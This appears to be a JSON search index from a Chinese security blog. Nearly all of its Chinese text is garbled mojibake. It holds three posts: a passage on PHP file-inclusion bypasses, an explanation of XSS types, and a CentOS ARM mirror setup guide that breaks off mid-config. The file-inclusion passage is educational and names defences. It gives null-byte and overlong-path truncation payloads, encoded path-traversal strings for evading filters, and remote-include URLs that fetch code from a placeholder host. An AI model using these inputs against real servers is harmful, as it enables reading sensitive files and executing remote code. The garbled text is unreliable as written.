ç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowä¸‹åªæœ‰65535ä¸­ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚ å¦ä¸€ç§æ–¹æ³•æ˜¯é…åˆphpinfoé¡µé¢çš„php variablesï¼Œå¯ä»¥ç›´æ¥è·å–åˆ°ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„å’Œä¸´æ—¶æ–‡ä»¶åï¼Œç›´æ¥åŒ…å«å³å¯ã€‚è¿™ä¸ªæ–¹æ³•å¯ä»¥å‚è€ƒ[LFI With PHPInfo Assistance](https://www.insomniasec.com/downloads/publications/LFI With PHPInfo Assistance.pdf) åŒ…å«ä¸Šä¼ æ–‡ä»¶XMANå¤ä»¤è¥-2017-babyweb-writeup ç»•è¿‡æ–¹å¼00å­—ç¬¦æˆªæ–­ è¿™ç§æ–¹å¼éœ€è¦ PHPç‰ˆæœ¬&lt;&#x3D;5.2 ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶fileå‚æ•°ï¼Œå½“fileçš„å€¼ä¸º../../etc/passwd\\0æ—¶ï¼Œç›¸å½“äºæ‰§è¡Œäº†include &#39;/home/wwwrun/../../etc/passwd&#39;è¿™æ¡è¯­å¥ã€‚ å¦‚æœä¸é€‚ç”¨\\0æˆªæ–­çš„è¯ï¼Œè¢«åŒ…å«çš„æ–‡ä»¶å®é™…ä¸Šæ˜¯/etc/passwd.phpï¼Œä½†è¿™ä¸ªæ–‡ä»¶è‡ªç„¶æ˜¯ä¸å­˜åœ¨çš„ã€‚æ‰€ä»¥åœ¨è¿™ä¸ªåœ°æ–¹ï¼Œæ”»å‡»è€…åªè¦åœ¨æœ€ååŠ å…¥ä¸€ä¸ª0å­—èŠ‚ï¼ˆ\\x00ï¼‰ï¼Œå°±èƒ½æˆªæ–­fileå˜é‡ä¹‹åçš„å­—ç¬¦ä¸²ã€‚ å¦‚æœæ˜¯é€šè¿‡Webè¾“å…¥ï¼Œåªéœ€è¦UrlEencodeå˜ä¸ºï¼š 1../../etc/passwd%00 é˜²å¾¡æ–¹å¼ï¼šè¿‡æ»¤\\00æˆªæ–­å­—ç¬¦ï¼Œè¿‡æ»¤ä»£ç å¦‚ä¸‹ï¼š 12345678910&lt;?phpfunction getVal($name)&#123; $value = isset($_GET[$name]) ? $_GET[$name] : null; if (is_string($value)) &#123; $value = str_replace(&quot;\\0&quot;, &#x27;&#x27;, $value); &#125;&#125;?&gt; è¶…é•¿å­—ç¬¦æˆªæ–­ç›®å½•å­—ç¬¦ä¸²åœ¨Windowsä¸‹256å­—èŠ‚ã€Linuxä¸‹4096å­—èŠ‚æ—¶ï¼Œä¼šè¾¾åˆ°æœ€å¤§å€¼ï¼Œæœ€å¤§å€¼ä¹‹åçš„å­—ç¬¦è¢«ä¸¢å¼ƒã€‚å¯ä»¥é€šè¿‡./çš„æ–¹å¼æ„é€ ç›®å½•ï¼š 123././././././././././././abc//////////////////abc../1/abc../1/abc../1/abc ç›®å½•éå†é™¤äº†è¿™ç§æ”»å‡»æ–¹å¼ï¼Œè¿˜å¯ä»¥ä½¿ç”¨â€â€¦&#x2F;â€¦&#x2F;â€¦&#x2F;â€œè¿™æ ·çš„æ–¹å¼æ¥è¿”å›åˆ°ä¸Šå±‚ç›®å½•ä¸­ï¼Œè¿™ç§æ–¹å¼åˆè¢«ç§°ä¸ºâ€ç›®å½•éå†(Path Traversal)â€ã€‚å¸¸è§çš„ç›®å½•éå†æ¼æ´ï¼Œè¿˜å¯ä»¥é€šè¿‡ä¸åŒçš„ç¼–ç æ–¹å¼æ¥ç»•è¿‡ä¸€äº›æœåŠ¡å™¨ç«¯çš„é˜²å¾¡é€»è¾‘(WAF) ï¼š 12345678%2e%2e%2f -&gt; ../%2e%2e/ -&gt; ../..%2f -&gt; ../%2e%2e%5c -&gt; ..\\%2e%2e%\\ -&gt; ..\\..%5c -&gt; ..\\%252e%252e%255c -&gt; ..\\..%255c -&gt; ..\\ é˜²å¾¡æ–¹å¼ ç›®å½•éå†æ¼æ´æ˜¯ä¸€ç§è·¨è¶Šç›®å½•è¯»å–æ–‡ä»¶çš„æ–¹æ³•ï¼Œä½†å½“PHPé…ç½®äº†open_basediræ—¶ï¼Œå°†å¾ˆå¥½åœ°ä¿æŠ¤æœåŠ¡å™¨ï¼Œä½¿å¾—è¿™ç§æ”»å‡»æ— æ•ˆã€‚open_basedirçš„ä½œç”¨æ˜¯é™åˆ¶åœ¨æŸä¸ªç‰¹å®šç›®å½•ä¸‹PHPèƒ½æ‰“å¼€çš„æ–‡ä»¶ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œopen_basedirçš„å€¼æ˜¯ç›®å½•çš„å‰ç¼€ï¼Œå¦‚æœè®¾ç½®å¦‚ä¸‹ï¼š 1open_basedir = /home/aaa é‚£ä¹ˆä»¥ä¸‹çš„ç›®å½•éƒ½æ˜¯è¢«å…è®¸çš„ï¼š 123/home/aaa/home/aaa/bbb/home/aaa/ccc å¦‚æœè¦é™å®šä¸€ä¸ªæŒ‡å®šçš„ç›®å½•ï¼Œåˆ™éœ€è¦åœ¨åé¢åŠ ä¸Šä¸€ä¸ª/ï¼š 1&gt;open_basedir = /home/aaa/ URLç»•è¿‡queryï¼ˆ?ï¼‰1index.php?file=http://remoteaddr/remoteinfo.txt? åˆ™åŒ…å«çš„æ–‡ä»¶ä¸º http://remoteaddr/remoteinfo.txt?/test/test.php ã€‚ é—®å·åé¢çš„éƒ¨åˆ†/test/test.phpï¼Œä¹Ÿå°±æ˜¯æŒ‡å®šçš„åç¼€è¢«å½“ä½œqueryä»è€Œè¢«ç»•è¿‡ã€‚ fragment(#)1index.php?file=http://remoteaddr/remoteinfo.txt%23 åˆ™åŒ…å«çš„æ–‡ä»¶ä¸ºhttp://remoteaddr/remoteinfo.txt#/test/test.php ã€‚ é—®å·åé¢çš„éƒ¨åˆ†/test/test.phpï¼Œä¹Ÿå°±æ˜¯æŒ‡å®šçš„åç¼€è¢«å½“ä½œfragmentä»è€Œè¢«ç»•è¿‡ã€‚æ³¨æ„éœ€è¦æŠŠ#è¿›è¡Œurlç¼–ç ä¸º%23ã€‚ å‚è€ƒæ–‡ç« https://ca01h.top/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"Webå®‰å…¨/æ–‡ä»¶åŒ…å«","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"tags":[{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"https://gryffinbit.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"author":"Gryffinbit"},{"title":"XSSçš„å½¢æˆåŸç†ï¼ˆä¸åŒç±»å‹ï¼‰","slug":"XSSçš„å½¢æˆåŸç†ï¼ˆä¸åŒç±»å‹ï¼‰","date":"2022-09-22T10:22:42.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/09/22/XSSçš„å½¢æˆåŸç†ï¼ˆä¸åŒç±»å‹ï¼‰/","permalink":"https://gryffinbit.top/2022/09/22/XSS%E7%9A%84%E5%BD%A2%E6%88%90%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%8D%E5%90%8C%E7%B1%BB%E5%9E%8B%EF%BC%89/","excerpt":"","text":"åŸç†XSSï¼šè·¨ç«™è„šæœ¬æ”»å‡» æ˜¯ä¸€ç§æ³¨å…¥æ”»å‡»ï¼Œå½“webåº”ç”¨å¯¹ç”¨æˆ·è¾“å…¥è¿‡æ»¤ä¸ä¸¥è°¨æ—¶ï¼Œæ”»å‡»è€…å†™å…¥æ¶æ„çš„è„šæœ¬ä»£ç åˆ°ç½‘é¡µä¸­ï¼Œå¦‚æœç”¨æˆ·è®¿é—®äº†å«æœ‰æ¶æ„ä»£ç çš„ç½‘é¡µï¼Œæ¶æ„è„šæœ¬å°±ä¼šè¢«æµè§ˆå™¨è§£ææ‰§è¡Œå¹¶å¯¼è‡´ç”¨æˆ·è¢«æ”»å‡»ã€‚ å¸¸è§çš„å±å®³åŒ…æ‹¬ï¼š ç½‘ç»œé’“é±¼ï¼ŒåŒ…æ‹¬è·å–å„ç±»ç”¨æˆ·è´¦å· çªƒå–ç”¨æˆ·cookiesèµ„æ–™ï¼Œä»è€Œè·å–ç”¨æˆ·éšç§ä¿¡æ¯ï¼Œæˆ–åˆ©ç”¨ç”¨æˆ·èº«ä»½è¿›ä¸€æ­¥å¯¹ç½‘ç«™æ‰§è¡Œæ“ä½œï¼› åŠ«æŒç”¨æˆ·ï¼ˆæµè§ˆå™¨ï¼‰ä¼šè¯ï¼Œä»è€Œæ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚éæ³•è½¬è´¦ã€å¼ºåˆ¶å‘è¡¨æ—¥å¿—ã€ç”µå­é‚®ä»¶ç­‰ å¼ºåˆ¶å¼¹å‡ºå¹¿å‘Šé¡µé¢ã€åˆ·æµé‡ç­‰ ç½‘é¡µæŒ‚é©¬ï¼› è¿›è¡Œæ¶æ„æ“ä½œï¼Œå¦‚ä»»æ„ç¯¡æ”¹é¡µé¢ä¿¡æ¯ã€åˆ é™¤æ–‡ç« ç­‰ è¿›è¡Œå¤§é‡çš„å®¢æˆ·ç«¯æ”»å‡»ï¼Œå¦‚ddosç­‰ è·å–å®¢æˆ·ç«¯ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·çš„æµè§ˆå†å²ã€çœŸå®ipã€å¼€æ”¾ç«¯å£ç­‰ æ§åˆ¶å—å®³è€…æœºå™¨å‘å…¶ä»–ç½‘ç«™å‘èµ·æ”»å‡»ï¼› ç»“åˆå…¶ä»–æ¼æ´ï¼Œå¦‚csrfï¼Œå®æ–½è¿›æ­¥å±å®³ï¼› æå‡ç”¨æˆ·æƒé™ï¼ŒåŒ…æ‹¬è¿›ä¸€æ­¥æ¸—é€ç½‘ç«™ ä¼ æ’­è·¨ç«™è„šæœ¬è •è™«ç­‰ xsså¸¸è§å‡ºç°çš„åœ°æ–¹ æ•°æ®äº¤äº’çš„åœ°æ–¹ postã€getã€cookieã€headers åé¦ˆä¸æµè§ˆ å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ å„ç±»æ ‡ç­¾æ’å…¥å’Œè‡ªå®šä¹‰ æ•°æ®è¾“å‡ºçš„åœ°æ–¹ ç”¨æˆ·èµ„æ–™ å…³é”®è¯ã€æ ‡ç­¾ã€è¯´æ˜ æ–‡ä»¶ä¸Šä¼  é˜²å¾¡æ‰‹æ®µ å¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ å¯¹è¾“å‡ºè¿›è¡Œè½¬ä¹‰ åå°„å‹XSSéæŒä¹…å‹XSSã€‚è¿™ç§æ”»å‡»æ–¹å¼å¾€å¾€å…·æœ‰ä¸€æ¬¡æ€§ï¼Œåªåœ¨ç”¨æˆ·å•å‡»æ—¶è§¦å‘ã€‚è·¨ç«™ä»£ç ä¸€èˆ¬å­˜åœ¨é“¾æ¥ä¸­ï¼Œå½“å—å®³è€…è¯·æ±‚è¿™æ ·çš„é“¾æ¥æ—¶ï¼Œè·¨ç«™ä»£ç ç»è¿‡æœåŠ¡ç«¯åå°„å›æ¥ï¼Œè¿™ç±»è·¨ç«™çš„ä»£ç é€šå¸¸ä¸å­˜å‚¨åœ¨æœåŠ¡ç«¯ã€‚ å¸¸è§æ³¨å…¥ç‚¹:ç½‘ç«™çš„æœç´¢æ ã€ç”¨æˆ·ç™»å½•å…¥å£ã€è¾“å…¥è¡¨å•ç­‰åœ°æ–¹ï¼Œå¸¸ç”¨æ¥çªƒå–å®¢æˆ·ç«¯cookiesæˆ–é’“é±¼æ¬ºéª—ã€‚æ¼æ´äº§ç”ŸåŸå› ä¸€èˆ¬æ˜¯ç½‘ç«™åªæ˜¯ç®€å•åœ°å°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®ç›´æ¥æˆ–æœªç»è¿‡å®Œå–„çš„å®‰å…¨è¿‡æ»¤å°±åœ¨æµè§ˆå™¨ä¸­è¿›è¡Œè¾“å²€ï¼Œå¯¼è‡´è¾“å²€çš„æ•°æ®ä¸­å­˜åœ¨å¯è¢«æµè§ˆå™¨æ‰§è¡Œçš„ä»£ç æ•°æ® æ”»å‡»æ–¹å¼æ”»å‡»è€…é€šè¿‡ç”µå­é‚®ä»¶ç­‰æ–¹å¼å°†åŒ…å«XSSä»£ç çš„æ¶æ„é“¾æ¥å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚å½“ç›®æ ‡ç”¨æˆ·è®¿é—®è¯¥é“¾æ¥æ—¶ï¼ŒæœåŠ¡å™¨æ¥å—è¯¥ç›®æ ‡ç”¨æˆ·çš„è¯·æ±‚å¹¶è¿›è¡Œå¤„ç†ï¼Œç„¶åæœåŠ¡å™¨æŠŠå¸¦æœ‰XSSçš„ä»£ç å‘é€ç»™ç›®æ ‡ç”¨æˆ·çš„æµè§ˆå™¨ï¼Œæµè§ˆå™¨è§£æè¿™æ®µå¸¦æœ‰XSSä»£ç çš„æ¶æ„è„šæœ¬åï¼Œå°±ä¼šè§¦å‘XSSæ¼æ´ã€‚ ç”±äºæ­¤ç§ç±»å‹çš„è·¨ç«™ä»£ç å­˜åœ¨äºURLä¸­ï¼Œæ‰€ä»¥é»‘å®¢é€šå¸¸éœ€è¦é€šè¿‡è¯±éª—æˆ–åŠ å¯†å˜å½¢ç­‰æ–¹å¼å°†å­˜åœ¨æ¶æ„ä»£ç çš„é“¾æ¥å‘ç»™ç”¨æˆ·ï¼Œåªæœ‰ç”¨æˆ·ç‚¹å‡»ä»¥åæ‰èƒ½ä½¿å¾—æ”»å‡»æˆåŠŸå®æ–½ã€‚ åå°„å‹XSSæ”»å‡»çš„æµç¨‹å¦‚ä¸‹ï¼š æ”»å‡»è€…å¯»æ‰¾å…·æœ‰æ¼æ´çš„ç½‘ç«™ æ”»å‡»è€…ç»™ç”¨æˆ·å‘äº†ä¸€ä¸ªå¸¦æœ‰æ¶æ„å­—ç¬¦ä¸²çš„é“¾æ¥ ç”¨æˆ·ç‚¹å‡»äº†è¯¥é“¾æ¥ æœåŠ¡å™¨è¿”å›HTMLæ–‡æ¡£ï¼Œæ­¤æ—¶è¯¥æ–‡æ¡£å·²ç»åŒ…å«äº†é‚£ä¸ªæ¶æ„å­—ç¬¦ä¸² å®¢æˆ·ç«¯æ‰§è¡Œäº†æ¤å…¥çš„æ¶æ„è„šæœ¬ï¼ŒXSSæ”»å‡»å°±å‘ç”Ÿ å­˜å‚¨å‹XSSæŒä¹…å‹XSSï¼Œæ›´å…·æœ‰å¨èƒæ€§ã€‚æ”»å‡»è„šæœ¬å°†è¢«æ°¸ä¹…çš„å­˜æ”¾åœ¨ç›®æ ‡æœåŠ¡å™¨çš„æ•°æ®åº“æˆ–æ–‡ä»¶ä¸­ã€‚è¿™æ˜¯åˆ©ç”¨èµ·æ¥æœ€æ–¹ä¾¿çš„è·¨ç«™ç±»å‹ã€‚è·¨ç«™ä»£ç å­˜å‚¨äºæœåŠ¡ç«¯ã€‚ å¸¸è§æ³¨å…¥ç‚¹è®ºå›ã€åšå®¢ã€ç•™è¨€æ¿ã€ç½‘ç«™çš„ç•™è¨€ã€è¯„è®ºã€æ—¥å¿—ç­‰äº¤äº’å¤„ã€‚é€ æˆæ¼æ´åŸå› ä¸€èˆ¬æ˜¯ç”±äºWebåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥æ•°æ®çš„ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´Webåº”ç”¨ç¨‹åºå°†é»‘å®¢è¾“å…¥çš„æ¶æ„è·¨ç«™æ”»å‡»æ•°æ®ä¿¡æ¯ä¿å­˜åœ¨æœåŠ¡ç«¯çš„æ•°æ®åº“æˆ–å…¶ä»–æ–‡ä»¶å½¢å¼ä¸­ã€‚ æ”»å‡»æ–¹å¼æ”»å‡»è€…åœ¨å‘å¸–æˆ–ç•™è¨€çš„è¿‡ç¨‹ä¸­ï¼Œå°†æ¶æ„è„šæœ¬è¿åŒæ­£å¸¸ä¿¡æ¯ä¸€èµ·æ³¨å…¥åˆ°å‘å¸ƒå†…å®¹ä¸­ã€‚éšç€å‘å¸ƒå†…å®¹è¢«æœåŠ¡å™¨å­˜å‚¨ä¸‹æ¥ï¼Œæ¶æ„è„šæœ¬ä¹Ÿå°†æ°¸ä¹…çš„å­˜æ”¾åˆ°æœåŠ¡å™¨çš„åç«¯å­˜å‚¨å™¨ä¸­ã€‚å½“å…¶ä»–ç”¨æˆ·æµè§ˆè¿™ä¸ªè¢«æ³¨å…¥äº† æ¶æ„è„šæœ¬çš„å¸–å­æ—¶ï¼Œæ¶æ„è„šæœ¬å°±ä¼šåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­å¾—åˆ°æ‰§è¡Œã€‚ å­˜å‚¨å‹â…©SSæ”»å‡»çš„æµç¨‹å¦‚ä¸‹ ç”¨æˆ·æäº¤äº†ä¸€æ¡åŒ…å«XSSä»£ç çš„ç•™è¨€åˆ°æ•°æ®åº“ å½“ç›®æ ‡ç”¨æˆ·æŸ¥è¯¢ç•™è¨€æ—¶ï¼Œé‚£äº›ç•™è¨€çš„å†…å®¹ä¼šä»æœåŠ¡å™¨è§£æä¹‹ååŠ è½½å‡ºæ¥ æµè§ˆå™¨å‘ç°æœ‰XSSä»£ç ï¼Œå°±å½“åšæ­£å¸¸çš„HTMLå’ŒJSè§£ææ‰§è¡Œ DOMå‹XSSDOMæ˜¯æ–‡æ¡£å¯¹è±¡æ¨¡å‹Document Object Modelã€‚å®ƒæ˜¯HTMLæ–‡æ¡£çš„å¯¹è±¡è¡¨ç¤ºï¼ŒåŒæ—¶ä¹Ÿæ˜¯å¤–éƒ¨å†…å®¹ï¼ˆä¾‹å¦‚javascriptï¼‰ä¸htmlå…ƒç´ ä¹‹é—´çš„æ¥å£ã€‚è§£ææ ‘çš„æ ¹èŠ‚ç‚¹æ˜¯â€œdocumentâ€å¯¹è±¡ã€‚ä½¿ç”¨DOMä½¿ç¨‹åºå’Œè„šæœ¬èƒ½å¤ŸåŠ¨æ€è®¿é—®å’Œæ›´æ–°æ–‡æ¡£çš„å†…å®¹ã€ç»“æ„å’Œæ ·å¼ã€‚å®ƒæ˜¯åŸºäºDOMæ–‡æ¡£å¯¹è±¡çš„ä¸€ç§æ¼æ´ï¼Œå¹¶ä¸”DOMå‹XSSæ˜¯åŸºäºJSä¸Šçš„ï¼Œå¹¶ä¸éœ€è¦ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ã€‚ å…¶é€šè¿‡ä¿®æ”¹é¡µé¢DOMèŠ‚ç‚¹æ•°æ®ä¿¡æ¯è€Œå½¢æˆçš„â…©SSè·¨ç«™è„šæœ¬æ”»å‡»ã€‚ä¸åŒäºåå°„å‹XSSå’Œå­˜å‚¨å‹XSSï¼ŒåŸºäºDOMçš„XSSè·¨ç«™è„šæœ¬æ”»å‡»å¾€å¾€éœ€è¦é’ˆå¯¹å…·ä½“çš„ Javascript DOMä»£ç è¿›è¡Œåˆ†æï¼Œå¹¶æ ¹æ®å®é™…æƒ…å†µè¿›è¡ŒXSSè·¨ç«™è„šæœ¬æ”»å‡»çš„åˆ©ç”¨ã€‚ ä¸€ç§åŸºäºDOMçš„è·¨ç«™ï¼Œè¿™æ˜¯å®¢æˆ·ç«¯è„šæœ¬æœ¬èº«è§£æä¸æ­£ç¡®å¯¼è‡´çš„å®‰å…¨é—®é¢˜ æ³¨å…¥ç‚¹é€šè¿‡jsè„šæœ¬å¯¹æ–‡æ¡£å¯¹è±¡è¿›è¡Œç¼–è¾‘ï¼Œä»è€Œä¿®æ”¹é¡µé¢çš„å…ƒç´ ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥DOMåŠ¨æ€ä¿®æ”¹é¡µé¢çš„å†…å®¹ï¼Œä»å®¢æˆ·ç«¯è·å–DOMä¸­çš„æ•°æ®å¹¶åœ¨æœ¬åœ°æ‰§è¡Œã€‚ç”±äºDOMæ˜¯åœ¨å®¢æˆ·ç«¯ä¿®æ”¹èŠ‚ç‚¹çš„ï¼Œæ‰€ ä»¥åŸºäºDOMå‹çš„XSSæ¼æ´ä¸éœ€è¦ä¸æœåŠ¡å™¨ç«¯äº¤äº’ï¼Œå®ƒåªå‘ç”Ÿåœ¨å®¢æˆ·ç«¯å¤„ç†æ•°æ®çš„é˜¶æ®µã€‚ æ”»å‡»æ–¹å¼ç”¨æˆ·è¯·æ±‚ä¸€ä¸ªç»è¿‡ä¸“é—¨è®¾è®¡çš„URLï¼Œå®ƒç”±æ”»å‡»è€…æä¾›ï¼Œè€Œä¸”å…¶ä¸­åŒ…å«XSSä»£ç ã€‚æœåŠ¡å™¨çš„å“åº”ä¸ä¼šä»¥ä»»ä½•å½¢å¼åŒ…å«æ”»å‡»è€…çš„è„šæœ¬ï¼Œå½“ç”¨æˆ·çš„æµè§ˆå™¨å¤„ç†è¿™ä¸ªå“åº”æ—¶ï¼ŒDOMå¯¹è±¡å°±ä¼šå¤„ç†XSSä»£ç ï¼Œå¯¼è‡´å­˜ åœ¨XSSæ¼æ´ã€‚ æ”»å‡»æµç¨‹æ˜¯è¿™æ ·çš„ï¼š æ”»å‡»è€…å¯»æ‰¾å…·æœ‰æ¼æ´çš„ç½‘ç«™ æ”»å‡»è€…ç»™ç”¨æˆ·å‘äº†ä¸€ä¸ªå¸¦æœ‰æ¶æ„å­—ç¬¦ä¸²çš„é“¾æ¥ ç”¨æˆ·ç‚¹å‡»äº†è¯¥é“¾æ¥ æœåŠ¡å™¨è¿”å›HTMLæ–‡æ¡£ï¼Œä½†æ˜¯è¯¥æ–‡æ¡£æ­¤æ—¶ä¸åŒ…å«é‚£ä¸ªæ¶æ„å­—ç¬¦ä¸² å®¢æˆ·ç«¯æ‰§è¡Œäº†è¯¥HTMLæ–‡æ¡£é‡Œçš„è„šæœ¬ï¼Œç„¶åæŠŠæ¶æ„è„šæœ¬æ¤å…¥äº†é¡µé¢ å®¢æœç«¯æ‰§è¡Œäº†æ¤å…¥çš„æ¶æ„è„šæœ¬ï¼ŒXSSæ”»å‡»å°±å‘ç”Ÿäº† åå°„å‹XSSä¸DOMå‹åŒºåˆ« åå°„å‹XSSæ”»å‡»ä¸­ï¼ŒæœåŠ¡å™¨åœ¨è¿”å›HTMLæ–‡æ¡£çš„æ—¶å€™ï¼Œå°±å·²ç»åŒ…å«äº†æ¶æ„çš„è„šæœ¬; DOMå‹â…©SSæ”»å‡»ä¸­ï¼ŒæœåŠ¡å™¨åœ¨è¿”å›HTMLæ–‡æ¡£çš„æ—¶å€™ï¼Œæ˜¯ä¸åŒ…å«æ¶æ„è„šæœ¬çš„ï¼›æ¶æ„è„šæœ¬æ˜¯åœ¨å…¶æ‰§è¡Œäº†éæ¶æ„è„šæœ¬åï¼Œè¢«æ³¨å…¥åˆ°æ–‡æ¡£é‡Œçš„ é€šè¿‡JSè„šæœ¬å¯¹å¯¹æ–‡æ¡£å¯¹è±¡è¿›è¡Œç¼–è¾‘ï¼Œä»è€Œä¿®æ”¹é¡µé¢çš„å…ƒç´ ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥DOMåŠ¨æ€ä¿®æ”¹é¡µé¢çš„å†…å®¹ï¼Œä»å®¢æˆ·ç«¯è·å–DOMä¸­çš„æ•°æ®å¹¶åœ¨æœ¬åœ°æ‰§è¡Œã€‚ç”±äºDOMæ˜¯åœ¨å®¢æˆ·ç«¯ä¿®æ”¹èŠ‚ç‚¹çš„ï¼Œæ‰€ä»¥åŸºäºDOMå‹çš„XSSæ¼æ´ä¸éœ€è¦ä¸æœåŠ¡å™¨ç«¯äº¤äº’ï¼Œå®ƒåªå‘ç”Ÿåœ¨å®¢æˆ·ç«¯å¤„ç†æ•°æ®çš„é˜¶æ®µã€‚ å‚è€ƒèµ„æ–™https://www.freebuf.com/articles/web/289263.html","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"XSS","slug":"Webå®‰å…¨/XSS","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/XSS/"}],"tags":[],"author":"Gryffinbit"},{"title":"M1çš„è‡ªæ•‘ï¼šå¦‚ä½•åˆ¤æ–­æŠ¥é”™åæ˜¯å¦ä¸ºarmæ¶æ„çš„é”…ï¼","slug":"M1çš„è‡ªæ•‘ï¼šå¦‚ä½•åˆ¤æ–­æŠ¥é”™åæ˜¯å¦ä¸ºarmæ¶æ„çš„é”…ï¼","date":"2022-09-20T17:21:05.000Z","updated":"2024-11-12T06:59:28.000Z","comments":true,"path":"2022/09/21/M1çš„è‡ªæ•‘ï¼šå¦‚ä½•åˆ¤æ–­æŠ¥é”™åæ˜¯å¦ä¸ºarmæ¶æ„çš„é”…ï¼/","permalink":"https://gryffinbit.top/2022/09/21/M1%E7%9A%84%E8%87%AA%E6%95%91%EF%BC%9A%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%8A%A5%E9%94%99%E5%90%8E%E6%98%AF%E5%90%A6%E4%B8%BAarm%E6%9E%B6%E6%9E%84%E7%9A%84%E9%94%85%EF%BC%81/","excerpt":"","text":"ARMæºpip1pip install xx -i https://www.piwheels.org/simple ä»“åº“æ›´æ¢ï¼ˆcentosä¸¾ä¾‹ï¼‰æºé‡Œé¢ç»å¸¸ä¼šæœ‰è¿™ç§å˜é‡ï¼š 1https://mirrors.aliyun.com/centos-stream/$stream/AppStream/$basearch/os/ $basearch çš„å€¼ï¼Œç³»ç»Ÿç¡¬ä»¶æ¶æ„(CPUæŒ‡ä»¤é›†) æ¶æ„æ˜¯aarch64ï¼ˆARMï¼‰ $stream çš„å€¼ï¼Œå°±æ˜¯ç³»ç»Ÿç‰ˆæœ¬äº† ç‰ˆæœ¬æ˜¯CentOS Stream release 9 åœ°å€ä»£å…¥è¯¥ç³»ç»Ÿå˜é‡åçš„è·¯å¾„å°±æ˜¯ 1https://mirrors.aliyun.com/centos-stream/9-stream/AppStream/aarch64/os/ æ›´æ¢æº å¤‡ä»½ 1sudo mv /etc/yum.repos.d/centos.repo /etc/yum.repos.d/centos.repo.backup æ¢æˆé˜¿é‡Œæº 1sudo vi /etc/yum.repos.d/centos.repo 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# CentOS-Base.repo## The mirror system uses the connecting IP address of the client and the# update status of each mirror to pick mirrors that are updated to and# geographically close to the client. You should use this for CentOS updates# unless you are manually picking other mirrors.## If the mirrorlist= does not work for you, as a fall back you can try the # remarked out baseurl= line instead.## [base]name=CentOS-$releasever - Base - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/BaseOS/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/BaseOS/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/BaseOS/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official #additional packages that may be useful#[extras]#name=CentOS-$releasever - Extras - mirrors.aliyun.com#failovermethod=priority#baseurl=https://mirrors.aliyun.com/centos-stream/$stream/extras/$basearch/os/# http://mirrors.aliyuncs.com/centos-stream/$stream/extras/$basearch/os/# http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/extras/$basearch/os/#gpgcheck=1#gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official #additional packages that extend functionality of existing packages[centosplus]name=CentOS-$releasever - Plus - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/centosplus/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/centosplus/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/centosplus/$basearch/os/gpgcheck=1enabled=0gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official[PowerTools]name=CentOS-$releasever - PowerTools - mirrors.aliyun.comfailovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/PowerTools/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/PowerTools/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/PowerTools/$basearch/os/gpgcheck=1enabled=0gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official[AppStream]name=CentOS-$releasever - AppStream - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/AppStream/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/AppStream/$basearch/os/ 